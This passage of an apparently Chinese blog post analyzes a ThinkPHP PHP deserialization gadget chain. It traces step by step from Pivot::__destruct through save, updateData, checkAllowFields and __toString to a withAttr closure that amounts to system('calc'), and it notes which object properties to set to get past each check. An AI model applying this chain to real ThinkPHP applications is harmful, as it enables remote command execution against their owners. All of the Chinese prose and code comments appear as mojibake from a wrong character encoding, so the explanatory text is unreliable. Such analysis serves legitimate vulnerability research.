class="comment">// âœ… schema = nullï¼Œä¸è¿›å…¥</span></span><br><span class="line">                            â””â”€â”€ <span class="variable">$query</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">db</span>(<span class="keyword">array</span> <span class="variable">$scope</span> = [])</span><br><span class="line">                                â””â”€â”€ <span class="variable">$query</span> = <span class="built_in">self</span>::<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$this</span>-&gt;connection)</span><br><span class="line">                                â””â”€â”€ <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">name</span>(<span class="variable">$this</span>-&gt;name . <span class="variable">$this</span>-&gt;suffix) <span class="comment">// âœ… $this-&gt;name ä¸º Pivot å¯¹è±¡ï¼Œè§¦å‘ __toString()</span></span><br><span class="line"></span><br><span class="line">think\model\Pivot-&gt;<span class="title function_ invoke__">__toString</span>(): <span class="keyword">string</span>                          <span class="comment">// âœ… é­”æœ¯æ–¹æ³•å…¥å£</span></span><br><span class="line">â””â”€â”€ <span class="title function_ invoke__">toJson</span>(<span class="keyword">int</span> <span class="variable">$options</span> = JSON_UNESCAPED_UNICODE): <span class="keyword">string</span></span><br><span class="line">    â””â”€â”€ <span class="title function_ invoke__">toArray</span>(): <span class="keyword">array</span></span><br><span class="line">        â””â”€â”€ <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation)   <span class="comment">// âœ… $this-&gt;relation = []ï¼Œåˆå¹¶åä»ä¸º $this-&gt;data</span></span><br><span class="line">        â””â”€â”€ <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)                     <span class="comment">// âœ… $this-&gt;data = [&#x27;key&#x27; =&gt; [&#x27;key&#x27; =&gt; &#x27;calc&#x27;]]</span></span><br><span class="line">            â””â”€â”€ <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) <span class="comment">// âœ… hidden = []ï¼ŒhasVisible = falseï¼Œè¿›å…¥åˆ¤æ–­</span></span><br><span class="line">                â””â”€â”€ <span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span> = <span class="string">&quot;key&quot;</span>)</span><br><span class="line">                    â””â”€â”€ <span class="title function_ invoke__">getData</span>(<span class="keyword">string</span> <span class="variable">$name</span> = <span class="string">&quot;key&quot;</span>)</span><br><span class="line">                        â””â”€â”€ <span class="variable">$fieldName</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRealFieldName</span>(<span class="string">&quot;key&quot;</span>) <span class="comment">// âœ… strict = true ä¸”æ— é©¼å³°è½¬æ¢ï¼Œè¿”å› &quot;key&quot;</span></span><br><span class="line">                        â””â”€â”€ <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;key&quot;</span>, <span class="variable">$this</span>-&gt;data))   <span class="comment">// âœ… å‘½ä¸­</span></span><br><span class="line">                            â””â”€â”€ <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="string">&quot;key&quot;</span>] = [<span class="string">&quot;key&quot;</span> =&gt; <span class="string">&quot;calc&quot;</span>]</span><br><span class="line">                    â””â”€â”€ <span class="title function_ invoke__">getValue</span>(<span class="keyword">string</span> <span class="variable">$name</span> = <span class="string">&quot;key&quot;</span>, <span class="keyword">mixed</span> <span class="variable">$value</span> = [<span class="string">&quot;key&quot;</span> =&gt; <span class="string">&quot;calc&quot;</span>], <span class="keyword">bool</span> <span class="variable">$relation</span> = <span class="literal">false</span>)</span><br><span class="line">                        â””â”€â”€ <span class="variable">$fieldName</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRealFieldName</span>(<span class="string">&quot;key&quot;</span>) <span class="comment">// âœ… è¿”å› &quot;key&quot;</span></span><br><span class="line">                        â””â”€â”€ <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;withAttr[<span class="string">&quot;key&quot;</span>]))         <span class="comment">// âœ… å­˜åœ¨</span></span><br><span class="line">                            â””â”€â”€ <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="string">&quot;key&quot;</span>, <span class="variable">$this</span>-&gt;json))      <span class="comment">// âœ… json = [&quot;key&quot;]</span></span><br><span class="line">                                â””â”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;jsonAssoc)              <span class="comment">// âœ… jsonAssoc = true</span></span><br><span class="line">                                    â””â”€â”€ <span class="title function_ invoke__">getJsonValue</span>(<span class="variable">$name</span> = <span class="string">&quot;key&quot;</span>, <span class="variable">$value</span> = [<span class="string">&quot;key&quot;</span> =&gt; <span class="string">&quot;calc&quot;</span>])</span><br><span class="line">                                        â””â”€â”€ <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;withAttr[<span class="string">&quot;key&quot;</span>] <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$closure</span>) <span class="comment">// âœ… $this-&gt;withAttr[&quot;key&quot;] = [&quot;key&quot; =&gt; &quot;system&quot;]</span></span><br><span class="line">                                            â””â”€â”€ <span class="variable">$value</span>[<span class="variable">$k</span>] = <span class="variable">$closure</span>(<span class="variable">$value</span>[<span class="variable">$k</span>], <span class="variable">$value</span>)       <span class="comment">// âœ… ç­‰ä»·äº system(&quot;calc&quot;) å‘½ä»¤æ‰§è¡Œç‚¹</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="è°ƒç”¨é“¾åˆ†æ-3"><a href="#è°ƒç”¨é“¾åˆ†æ-3" class="headerlink" title="è°ƒç”¨é“¾åˆ†æ"></a>è°ƒç”¨é“¾åˆ†æ</h3><p>é¦–å…ˆåœ¨ <code>think\model\Pivot</code> çš„ <code>__destruct</code> æ–¹æ³•ä¸­ï¼Œå¦‚æœ <code>Pivot-&gt;lazySave</code> ä¸º <code>true</code> åˆ™ä¼šè°ƒç”¨åˆ° <code>Pivot-&gt;save</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ææ„æ–¹æ³•</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lazySave) &#123; <span class="comment">// âœ… $this-&gt;lazySave = true è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>(); <span class="comment">// ğŸ‘ˆ è°ƒç”¨ $this-&gt;save</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Pivot-&gt;lazySave</code> å‡½æ•°å¯ä»¥è°ƒç”¨åˆ° <code>Pivot-&gt;updateData</code> å‡½æ•°ï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰éœ€è¦ç»•è¿‡å‡ ä¸ªåˆ¤æ–­ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä¿å­˜å½“å‰æ•°æ®å¯¹è±¡</span></span><br><span class="line"><span class="comment"> * @access public</span></span><br><span class="line"><span class="comment"> * @param array  $data     æ•°æ® = []</span></span><br><span class="line"><span class="comment"> * @param string $sequence è‡ªå¢åºåˆ—å = null</span></span><br><span class="line"><span class="comment"> * @return bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public function <span class="title function_">save</span><span class="params">(<span class="built_in">array</span> $data = [], <span class="built_in">string</span> $sequence = null)</span>: <span class="type">bool</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// æ•°æ®å¯¹è±¡èµ‹å€¼</span></span><br><span class="line">    $this-&gt;setAttrs($data); <span class="comment">// âœ… $data = [] æ„å‘³ç€è¿™ä¸ªå‡½æ•°ä»€ä¹ˆä¹Ÿæ²¡åš</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($this-&gt;isEmpty() || <span class="comment">// this-&gt;data éç©ºå¯¼è‡´ isEmpty è¿”å› false</span></span><br><span class="line">        <span class="literal">false</span> === $this-&gt;trigger(<span class="string">&#x27;BeforeWrite&#x27;</span>)) &#123; <span class="comment">// $this-&gt;withEvent = false =&gt; trigger è¿”å› false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ğŸ“Œ $this-&gt;exists = true è°ƒç”¨ $this-&gt;updateData()</span></span><br><span class="line">    $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]   </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é¦–å…ˆæ˜¯ <code>Pivot-&gt;setAttrs</code> ï¼Œç”±äºæˆ‘ä»¬è°ƒç”¨ <code>save</code> å‡½æ•°æ—¶æ²¡æœ‰ä¼ å‚ï¼Œå› æ­¤ <code>save</code> å‡½æ•°é‡‡ç”¨é»˜è®¤å‚æ•°ï¼Œå³ <code>$data = []</code>ï¼Œå› æ­¤ <code>setAttrs</code> å‡½æ•°çš„å‚æ•° <code>$data</code> ä¸ºç©ºæ•°ç»„ï¼Œå› æ­¤å¹¶æ²¡æœ‰æ‰§è¡Œä»€ä¹ˆé€»è¾‘å°±è¿”å›äº†ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é€šè¿‡ä¿®æ”¹å™¨ æ‰¹é‡è®¾ç½®æ•°æ®å¯¹è±¡å€¼</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  array $data  æ•°æ® = []</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setAttrs</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// âŒ  $data = [] æ²¡æœ‰è¿›å…¥å¾ªç¯</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åå°±æ˜¯ä¸‹é¢è¿™ä¸ªåˆ¤æ–­ï¼Œæˆ‘ä»¬éœ€è¦è®©åˆ¤æ–­ä¸­çš„ä¸¤ä¸ªæ¡ä»¶éƒ½ä¸æ»¡è¶³ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isEmpty</span>() || <span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeWrite&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é¦–å…ˆ <code>Pivot-&gt;isEmpty</code> è¦æ±‚ <code>Pivot-&gt;data</code> ä¸ä¸ºç©ºï¼Œè¿™é‡Œæˆ‘ä»¬éšä¾¿å¡«ä¸€ä¸ªéç©ºæ•°ç»„å³å¯ï¼ˆè¿™é‡Œå¿…é¡»æ˜¯æ•°ç»„ç±»å‹æ˜¯å› ä¸ºåé¢ <code>getChangedData</code> æœ‰è¿”å›å€¼æœ‰ç±»å‹å£°æ˜ï¼‰ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ¤æ–­æ¨¡å‹æ˜¯å¦ä¸ºç©º</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è€Œå¯¹äºåé¢çš„ <code>trigger</code> æˆ‘ä»¬ç›´æ¥è®¾ç½® <code>$this-&gt;withEvent = false</code> å³å¯ç»•è¿‡ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è§¦å‘äº‹ä»¶</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $event äº‹ä»¶å</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$event</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// âœ… $this-&gt;withEvent = false å¯¼è‡´å‡½æ•°è¿”å› true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æœ€åæˆ‘ä»¬è®¾ç½® <code>$this-&gt;exists = true</code> è°ƒç”¨ <code>$this-&gt;updateData</code>ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;exists ? <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateData</span>() : <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insertData</span>(<span class="variable">$sequence</span>);</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ <code>updateData</code> å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å¸Œæœ›è°ƒç”¨åˆ° <code>checkAllowFields</code>ï¼Œä¸ºæ­¤åŒæ ·éœ€è¦ç»•è¿‡ä¸€äº›åˆ¤æ–­ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// âŒ $this-&gt;withEvent = false =&gt; $this-&gt;trigger è¿”å› true =&gt; ä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeUpdate&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkData</span>(); <span class="comment">// âœ… ç©ºå‡½æ•°ä»€ä¹ˆä¹Ÿä¸åš</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// âš ï¸ æ³¨æ„ï¼š</span></span><br><span class="line">    <span class="comment">// 1. $this-&gt;force = true ç¡®ä¿è¿”å› $this-&gt;data</span></span><br><span class="line">    <span class="comment">// 2. $this-&gt;readonly ä¸ºç©ºé˜²æ­¢è¿›å…¥å¾ªç¯å¹²æ‰°</span></span><br><span class="line">    <span class="comment">// 3. $this-&gt;data ç±»å‹å¿…é¡»ä¸º array ç¡®ä¿é€šè¿‡è¿”å›å€¼ç±»å‹æ£€æµ‹</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getChangedData</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123; <span class="comment">// âŒ $data ä¸ºéç©ºæ•°ç»„ä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// âŒ $this-&gt;autoWriteTimestamp ä¸ºç©ºä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="variable language_">$this</span>-&gt;updateTime) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥å…è®¸å­—æ®µ</span></span><br><span class="line">    <span class="variable">$allowFields</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkAllowFields</span>(); <span class="comment">// ğŸ‘ˆ è°ƒç”¨ checkAllowFields å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é¦–å…ˆæ˜¯ <code>trigger</code> å‰é¢åˆ†æè¿‡äº†ï¼Œå¯ä»¥è¿”å› <code>true</code> ç»•è¿‡ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// âŒ $this-&gt;withEvent = false =&gt; $this-&gt;trigger è¿”å› true =&gt; ä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeUpdate&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç„¶å <code>$this-&gt;checkData()</code> æ˜¯ä¸ªç©ºå‡½æ•°ä»€ä¹ˆä¹Ÿæ²¡åšã€‚</p>
<p>ä¹‹åæ˜¯ <code>getChangedData</code>ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½® <code>Pivot-&gt;force = true</code> ä½¿å…¶ç›´æ¥è¿”å› <code>$this-&gt;data</code> å³å¯ã€‚ä¸è¿‡è¦æ³¨æ„çš„æ˜¯ <strong><code>getChangedData</code> è¿”å›ç±»å‹è¢«å£°æ˜ä¸º <code>array</code>ï¼Œè¿™è¦æ±‚ <code>$this-&gt;data</code> å¿…é¡»æ˜¯æ•°ç»„ç±»å‹çš„ã€‚</strong></p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–å˜åŒ–çš„æ•°æ® å¹¶æ’é™¤åªè¯»æ•°æ®</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span>(<span class="params"></span>): <span class="title">array</span> // ğŸ‘ˆ è¿”å›å€¼ç±»å‹æ¯”å¦‚ä¸º <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ğŸ“Œ $this-&gt;force = true =&gt; $data = $this-&gt;data</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;force ? <span class="variable language_">$this</span>-&gt;data : ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// âŒ $this-&gt;readonly ä¸ºç©ºï¼Œä¸è¿›å…¥å¾ªç¯</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;<span class="keyword">readonly</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$field</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>; <span class="comment">// ğŸ‘ˆ è¿”å› $this-&gt;data ç¡®ä¿ç±»å‹ä¸º array</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å†ä¹‹åå‡ ä¸ªåˆ¤æ–­ä¹Ÿå¾ˆå¥½ç»•è¿‡ã€‚<code>$data</code> æ˜¯æ¥è‡ª <code>getChangedData</code> è¿”å›çš„ <code>$this-&gt;data</code>ï¼Œå‰é¢å·²ç»æœ‰è¦æ±‚ä¸ä¸ºç©ºäº†ã€‚ç„¶å <code>$this-&gt;autoWriteTimestam</code> é»˜è®¤ä¸º <code>false</code> ä¹Ÿä¸ä¼šè¿›å…¥åˆ¤æ–­ã€‚ä¹‹åå°±å¯ä»¥é¡ºåˆ©è°ƒç”¨åˆ° <code>checkAllowFields</code> å‡½æ•°äº†ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $data æ¥è‡ª getChangedData è¿”å›çš„ $this-&gt;data ä¸ä¸ºç©º</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123; <span class="comment">// âŒ ä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// âŒ $this-&gt;autoWriteTimestamp ä¸ºç©ºä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="variable language_">$this</span>-&gt;updateTime) &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ£€æŸ¥å…è®¸å­—æ®µ</span></span><br><span class="line"><span class="variable">$allowFields</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkAllowFields</span>(); <span class="comment">// ğŸ‘ˆ è°ƒç”¨ checkAllowFields å‡½æ•°</span></span><br></pre></td></tr></table></figure></div>

<p>åœ¨ <code>checkAllowFields</code> å‡½æ•°ä¸­æˆ‘ä»¬å¸Œæœ›è°ƒç”¨åˆ° <code>db</code> å‡½æ•°ã€‚è¿™å°±è¦æ±‚æˆ‘ä»¬ä¼ªé€  <code>$this-&gt;field</code> å’Œ <code>$this-&gt;schema</code> éƒ½ä¸ºç©ºã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ£€æŸ¥æ•°æ®æ˜¯å¦å…è®¸å†™å…¥</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// æ£€æµ‹å­—æ®µ</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;field)) &#123; <span class="comment">// âœ… $this-&gt;field ä¸ºç©ºè¿›å…¥ åˆ¤æ–­</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;schema)) &#123; <span class="comment">// âŒ $this-&gt;schema ä¸ºç©ºè¿›å…¥ else</span></span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$query</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">db</span>(); <span class="comment">// ğŸ‘ˆ è°ƒç”¨ db å‡½æ•°</span></span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

